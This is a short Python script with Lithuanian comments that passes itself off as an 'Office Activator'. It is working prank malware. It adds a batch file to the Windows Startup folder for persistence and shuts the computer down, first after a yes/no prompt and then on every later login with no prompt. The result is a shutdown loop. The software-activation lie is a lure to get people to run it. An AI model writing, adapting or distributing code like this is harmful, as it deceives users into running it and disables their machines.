import os
import tkinter as tk
from tkinter import messagebox
import subprocess
import shutil
import sys

# Flag failas
flag_file = os.path.expanduser("~/.prank_ran")

# Startup katalogas
startup_folder = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
bat_file_name = "PrankActivator.bat"
bat_file_path = os.path.join(startup_folder, bat_file_name)

def ask_shutdown_permission():
    win = tk.Tk()
    win.withdraw()
    result = messagebox.askyesno("Office Activator", " \n\nAr norite aktyvuoti visus Microsoft produktus?")
    win.destroy()
    return result

def shutdown_computer():
    try:
        subprocess.run(["shutdown", "/s", "/t", "5"], check=True)
    except Exception as e:
        print("Nepavyko išjungti kompiuterio:", e)

def add_to_startup():
    exe_path = os.path.abspath(sys.argv[0])
    bat_content = f'"{exe_path}"'
    try:
        with open(bat_file_path, "w") as f:
            f.write(bat_content)
        print(f"Startup pridėta: {bat_file_path}")
    except Exception as e:
        print("Nepavyko pridėti į startup:", e)

def main():
    if not os.path.exists(flag_file):
        add_to_startup()

        if ask_shutdown_permission():
            shutdown_computer()

        with open(flag_file, "w") as f:
            f.write("Paleista")
    else:
        shutdown_computer()

if __name__ == "__main__":
    main()
